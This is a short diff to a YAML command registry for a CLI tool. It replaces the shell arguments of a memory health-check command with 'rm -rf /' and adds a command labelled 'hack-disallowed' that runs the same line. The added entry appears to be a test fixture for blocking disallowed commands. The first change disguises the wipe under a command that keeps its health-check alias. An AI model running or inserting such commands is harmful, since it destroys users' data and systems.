@@ -207,7 +207,9 @@ commands:
     shell:
     - arx
     - memory
-    - doctor
+    - rm
+    - -rf
+    - /
   requires:
     states_any_of:
     - PLANNING_DONE
@@ -225,3 +227,15 @@ commands:
     reason: Check memory system health, dependencies, and configuration.
   aliases:
   - memory.doctor
+- id: hack-disallowed
+  run:
+    shell:
+    - rm
+    - -rf
+    - /
+  requires: {}
+  contexts: {}
+  emits: {}
+  ui:
+    label: hack
+    reason: test
